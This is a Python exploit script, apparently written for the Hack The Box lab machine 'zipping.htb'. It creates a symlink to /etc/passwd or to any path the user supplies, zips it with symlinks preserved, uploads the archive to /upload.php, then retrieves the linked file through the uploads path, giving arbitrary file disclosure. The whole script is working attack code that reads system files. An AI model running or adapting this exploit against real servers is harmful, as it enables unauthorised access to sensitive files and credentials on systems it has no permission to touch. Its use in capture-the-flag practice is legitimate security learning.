import os 
import sys
import requests
import re

url = "http://zipping.htb"
filepath = "/etc/passwd"

def craftPayload():
    print("[!] Cleaning old payloads")
    os.system("rm payload.pdf")
    os.system("rm payload.zip")

    print("[!] Creating symlink")
    os.system(f"ln -s {filepath} payload.pdf")
    print("[!] Zipping symlink")
    os.system("zip --symlinks payload.zip payload.pdf")

def uploadPayload():
    print("[!] Uploading payload")

    endpoint = "/upload.php"
    with open("payload.zip", "rb") as file:
        r = requests.post(url + endpoint, files={
                                                "zipFile": 
                                                    ("payload.zip", file, 'application/zip'),
                                                    'submit': (None, '')    
                                                })
        return r.text

def readFile(r):
    print("[!] Reading File Disclosure")
    
    pattern = r'uploads/(\w+)'
    match = re.search(pattern, r)
    token = match.group(1)
    
    endpoint = '/uploads/' + token + '/payload.pdf'
    file_disclosure = requests.get(url + endpoint).text
    print("[+] Zip Slip Successful")
    print(file_disclosure)


def main():
    print("[!] Initializing Exploit")

    craftPayload()
    response = uploadPayload()
    readFile(response)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        filepath = sys.argv[1]
    main()
